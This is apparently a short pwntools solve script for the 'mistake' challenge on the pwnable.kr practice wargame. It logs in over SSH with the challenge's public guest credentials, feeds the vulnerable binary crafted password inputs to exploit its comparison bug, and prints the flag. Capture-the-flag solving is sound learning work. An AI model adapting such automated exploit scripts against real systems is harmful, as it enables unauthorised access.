from pwn import *

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 2222
REMOTE_USERNAME = "mistake"
REMOTE_PASSWORD = "guest"

shell = ssh(host = REMOTE_ADDRESS, port = REMOTE_PORT, user = REMOTE_USERNAME, password = REMOTE_PASSWORD)
process = shell.process([b'./mistake'])

# set password
process.recvuntil(b"...\n")
process.sendline(b"0000000000")

# input password
process.recvuntil(b"password : ")
process.sendline(b"1111111111")

# recv "Password OK"
process.recvline()

flag = process.recvline().decode().strip()

print(f"Flag is: {flag}")